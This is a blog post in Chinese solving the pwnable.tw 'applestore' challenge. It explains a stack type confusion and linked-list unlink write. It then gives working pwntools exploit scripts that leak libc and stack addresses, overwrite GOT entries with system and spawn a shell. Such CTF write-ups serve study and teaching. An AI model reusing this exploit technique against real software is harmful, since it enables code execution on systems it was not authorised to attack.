<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="I is so vegetable:(，我tcl又由于忙于毕设和各种比赛各种耽误，到今天才真正把这题搞出来"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>pwnable.tw applestore | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-time">2019-06-05</div></div></div><div class="container post-header"><h1>pwnable.tw applestore</h1></div><div class="container post-content"><p>I is so vegetable:(，我tcl又由于忙于毕设和各种比赛各种耽误，到今天才真正把这题搞出来</p>
<p>存储结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x804B070链表头</span><br><span class="line">struct _mycart_binlist</span><br><span class="line">&#123;</span><br><span class="line">    int *name;    &#x2F;&#x2F;ebp-0x20</span><br><span class="line">    int price;        &#x2F;&#x2F;ebp-0x1c</span><br><span class="line">    struct _mycart_binlist *next;    &#x2F;&#x2F;ebp-0x18</span><br><span class="line">    struct _mycart_binlist *pre;    &#x2F;&#x2F;ebp-0x14</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>insert</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl insert(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  _DWORD *i; &#x2F;&#x2F; [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; &amp;myCart; i[2]; i &#x3D; (_DWORD *)i[2] )</span><br><span class="line">    ;</span><br><span class="line">  i[2] &#x3D; a1;                                    &#x2F;&#x2F; the_last_mycart-&gt;next&#x3D;inserted</span><br><span class="line">  result &#x3D; a1;</span><br><span class="line">  *(_DWORD *)(a1 + 12) &#x3D; i;                     &#x2F;&#x2F; inserted-&gt;pre&#x3D;the_last_mycart</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>checkout</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned int checkout()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+10h] [ebp-28h]</span><br><span class="line">  char *v2; &#x2F;&#x2F; [esp+18h] [ebp-20h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v4; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  v1 &#x3D; cart();</span><br><span class="line">  if ( v1 &#x3D;&#x3D; 7174 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</span><br><span class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</span><br><span class="line">    v3 &#x3D; 1;                                     &#x2F;&#x2F; price&#x3D;1</span><br><span class="line">    insert((int)&amp;v2);                         </span><br><span class="line">    v1 &#x3D; 7175;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Total: $%d\n&quot;, v1);</span><br><span class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在问题的应该是checkout的insert，用贪心的思想求解下v1=7174各个商品的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">7174</span><br><span class="line">14*499&#x3D;6986</span><br><span class="line">13*499&#x3D;6487</span><br><span class="line">12*499&#x3D;5988    1186</span><br><span class="line">11*499&#x3D;5489    1685</span><br><span class="line">10*499&#x3D;4990    2184</span><br><span class="line">9*499&#x3D;4491    2683</span><br><span class="line">8*499&#x3D;3992    3182</span><br><span class="line">7*499&#x3D;3493    3681</span><br><span class="line">6*499&#x3D;2994    4180</span><br><span class="line">5*499&#x3D;2495    4679-99*21&#x3D;2600</span><br><span class="line">100x+200y+300z&#x3D;2600    &#x3D;&gt;x+2y+3z&#x3D;26</span><br><span class="line">x+y+z&#x3D;21</span><br><span class="line">        &#x3D;&gt;y+2z&#x3D;5</span><br><span class="line">        y&#x3D;1    z&#x3D;2</span><br><span class="line">        x&#x3D;18    c&#x3D;5</span><br><span class="line">199x 299y 399z 499c</span><br></pre></td></tr></table></figure>

<p>写个脚本验证下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&#39;.&#x2F;applestore&#39;)</span><br><span class="line"></span><br><span class="line">def add(idx):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">    p.sendlineafter(&#39;Device Number&gt; &#39;,str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(0,18):</span><br><span class="line">    add(1)</span><br><span class="line">add(2)</span><br><span class="line">for i in range(0,2):</span><br><span class="line">    add(4)</span><br><span class="line">for i in range(0,5):</span><br><span class="line">    add(3)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,gdbscript&#x3D;&#39;b *0x08048B98\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里存在的问题是delete时执行my_read直接在栈中保存输入的字符串引起一个类型混淆，利用delete双向链表的断链操作DWORD_SHOOT得到一个任意地址写的机会，修改GOT即可导致任意代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  signed int idx; &#x2F;&#x2F; [esp+10h] [ebp-38h]</span><br><span class="line">  _DWORD *v2; &#x2F;&#x2F; [esp+14h] [ebp-34h]</span><br><span class="line">  int delete_obj; &#x2F;&#x2F; [esp+18h] [ebp-30h]</span><br><span class="line">  int next; &#x2F;&#x2F; [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int pre; &#x2F;&#x2F; [esp+20h] [ebp-28h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v7; &#x2F;&#x2F; [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  idx &#x3D; 1;</span><br><span class="line">  v2 &#x3D; (_DWORD *)dword_804B070;</span><br><span class="line">  printf(&quot;Item Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);                        &#x2F;&#x2F; 栈里边直接保存输入的字符串，虽然不会溢出，但这里会造成类型混淆</span><br><span class="line">  delete_obj &#x3D; atoi(&amp;nptr);</span><br><span class="line">  while ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( idx &#x3D;&#x3D; delete_obj )</span><br><span class="line">    &#123;</span><br><span class="line">      next &#x3D; v2[2];                             &#x2F;&#x2F; next</span><br><span class="line">      pre &#x3D; v2[3];                              &#x2F;&#x2F; pre</span><br><span class="line">      if ( pre )</span><br><span class="line">        *(_DWORD *)(pre + 8) &#x3D; next;            &#x2F;&#x2F; victim-&gt;pre-&gt;next&#x3D;victim-&gt;next</span><br><span class="line">      if ( next )</span><br><span class="line">        *(_DWORD *)(next + 12) &#x3D; pre;           &#x2F;&#x2F; victim-&gt;next-&gt;pre&#x3D;victim-&gt;pre</span><br><span class="line">      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, idx, *v2);</span><br><span class="line">      return __readgsdword(0x14u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++idx;</span><br><span class="line">    v2 &#x3D; (_DWORD *)v2[2];</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这里引起类型混淆的本质原因是我们执行checkout插入的V2距离ebp为EBP-20H，执行完checkout只是抬高栈帧，并不会销毁函数栈；而此时我们调用delete，会在调用checkout结束的位置开辟栈帧，这样得到的函数栈就和checkout的函数栈重叠，而delete会在栈中直接保存输入的字符串（EBP-22H的位置），就会引起一次类型混淆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">handler    ebp___</span><br><span class="line">    </span><br><span class="line">    　　　　38h</span><br><span class="line">    </span><br><span class="line">    　　　　esp__</span><br><span class="line">checkout   ebp__    delete  ebp__</span><br><span class="line">    </span><br><span class="line">    　　　　38h        　　   48h</span><br><span class="line">   　　　　 V2&#x3D;ebp-20h       nptr&#x3D;ebp-22h    </span><br><span class="line"></span><br><span class="line">    　　　　esp__            esp__</span><br></pre></td></tr></table></figure>

<p> DWORD_SHOT并不可行，如果我们如下构造struct执行DWORD_SHOT的话，虽然GOT表可写，但是由于双向链表断链过程会执行victim-&gt;pre=victim-&gt;next，即read@got会写入*system@got+12的位置，而*system@got+12位于libc text段，肯定不可写，这里会崩溃。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct</span><br><span class="line">&#123;</span><br><span class="line">    *name    &#x3D;&gt;    padding</span><br><span class="line">    price      &#x3D;&gt;    padding</span><br><span class="line">    *nexe    &#x3D;&gt;    read@got</span><br><span class="line">    *pre    &#x3D;&gt;    system@got</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下脚本可以验证DWORD_SHOT不可行。so,how to get it pwned?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&#39;.&#x2F;applestore&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;applestore&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.28.so&#39;)</span><br><span class="line"></span><br><span class="line">def add(idx):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">    p.sendlineafter(&#39;Device Number&gt; &#39;,str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;3&#39;)</span><br><span class="line">    p.sendlineafter(&#39;Item Number&gt;&#39;,str(idx))</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;5&#39;)</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;y&#39;)</span><br><span class="line"></span><br><span class="line">def cart(payload):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;4&#39;)</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,str(payload))</span><br><span class="line"></span><br><span class="line">for i in range(0,18):</span><br><span class="line">    add(1)</span><br><span class="line">add(2)</span><br><span class="line">for i in range(0,2):</span><br><span class="line">    add(4)</span><br><span class="line">for i in range(0,5):</span><br><span class="line">    add(3)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;y\x0a&#39;+p32(elf.got[&#39;read&#39;])+p32(1)+p32(0)+p32(0)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(&#39;27: &#39;)</span><br><span class="line">read_got&#x3D;u32(p.recv(4))</span><br><span class="line">libc_base&#x3D;read_got-libc.sym[&#39;read&#39;]</span><br><span class="line">success(&#39;libc_base:&#39;+hex(libc_base))</span><br><span class="line">success(&#39;read_got:&#39;+hex(read_got))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,gdbscript&#x3D;&#39;b *0x08048B98\n&#39;)    #b insert()</span><br><span class="line">gdb.attach(p,gdbscript&#x3D;&#39;&#39;&#39;</span><br><span class="line">    b *0x080489F0</span><br><span class="line">    break *0x080489FB if $[$ebp-0x38]&#x3D;&#x3D;27</span><br><span class="line">    &#39;&#39;&#39;)        #b delete_obj</span><br><span class="line"></span><br><span class="line">sys_got&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">success(&#39;system:&#39;+hex(sys_got))</span><br><span class="line">payload&#x3D;&#39;\x32\x37\x00\x20&#39;+&#39;b&#39;*6+p32(read_got-8)+p32(sys_got)</span><br><span class="line">delete(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,gdbscript&#x3D;&#39;b *0x080489FB\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p> 由于delete中我们有一次任意地址写的机会，而在执行完delete返回到handler时会再次引用栈内存ebp-0x22（在这个位置读入），所以我们考虑修改ebp的值，进而覆盖asprintf@got和atoi@got（这两个got的地址是相邻的），asprintf@got覆盖成’$0\x00\x00‘（4字节），atoi@got覆盖成sys_addr即可。这样在0x8048c16执行atoi时即执行system(‘$0’)即可getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;applestore&#39;)</span><br><span class="line">local&#x3D;1</span><br><span class="line">if local:</span><br><span class="line">    p&#x3D;process(&#39;.&#x2F;applestore&#39;)</span><br><span class="line">    libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.28.so&#39;)</span><br><span class="line">else:</span><br><span class="line">    p&#x3D;remote(&#39;chall.pwnable.tw&#39;,10104)</span><br><span class="line">    libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def add(idx):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">    p.sendlineafter(&#39;Device Number&gt; &#39;,str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;3&#39;)</span><br><span class="line">    p.sendlineafter(&#39;Item Number&gt;&#39;,str(idx))</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;5&#39;)</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;y&#39;)</span><br><span class="line"></span><br><span class="line">def cart(payload):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,&#39;4&#39;)</span><br><span class="line">    p.sendlineafter(&#39;&gt;&#39;,str(payload))</span><br><span class="line"></span><br><span class="line">for i in range(0,18):</span><br><span class="line">    add(1)</span><br><span class="line">add(2)</span><br><span class="line">for i in range(0,2):</span><br><span class="line">    add(4)</span><br><span class="line">for i in range(0,5):</span><br><span class="line">    add(3)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;y\x0a&#39;+p32(elf.got[&#39;read&#39;])+p32(1)+p32(0)+p32(0)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(&#39;27: &#39;)</span><br><span class="line">read_got&#x3D;u32(p.recv(4))</span><br><span class="line">libc.address&#x3D;read_got-libc.sym[&#39;read&#39;]</span><br><span class="line">env&#x3D;libc.sym[&#39;environ&#39;]</span><br><span class="line">success(&#39;libc_base:&#39;+hex(libc.address))</span><br><span class="line">success(&#39;read_got:&#39;+hex(read_got))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;y\x0a&#39;+p32(env)+p32(1)+p32(0)+p32(0)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(&#39;27: &#39;)</span><br><span class="line">stack_env&#x3D;u32(p.recv(4))</span><br><span class="line">success(&#39;stack_env:&#39;+hex(stack_env))</span><br><span class="line">ebp&#x3D;stack_env-0x104</span><br><span class="line">success(&#39;stack_ebp:&#39;+hex(ebp))</span><br><span class="line"></span><br><span class="line">asprintf_got&#x3D;elf.got[&#39;asprintf&#39;]</span><br><span class="line">atoi_got&#x3D;elf.got[&#39;atoi&#39;]</span><br><span class="line">sys&#x3D;libc.sym[&#39;system&#39;]</span><br><span class="line">payload&#x3D;&#39;27&#39;+p32(sys)+p32(1)+p32(ebp-12)+p32(asprintf_got+0x22)</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    gdb.attach(p,gdbscript&#x3D;&#39;&#39;&#39;</span><br><span class="line">        b *0x080489F0\n</span><br><span class="line">        b *0x08048A6F\n</span><br><span class="line">        b *0x8048c0b\n</span><br><span class="line">    &#39;&#39;&#39;)</span><br><span class="line">    pause()</span><br><span class="line">delete(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;from your shopping cart.&#39;)</span><br><span class="line">payload&#x3D;&#39;$0\x00\x00&#39;+p32(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>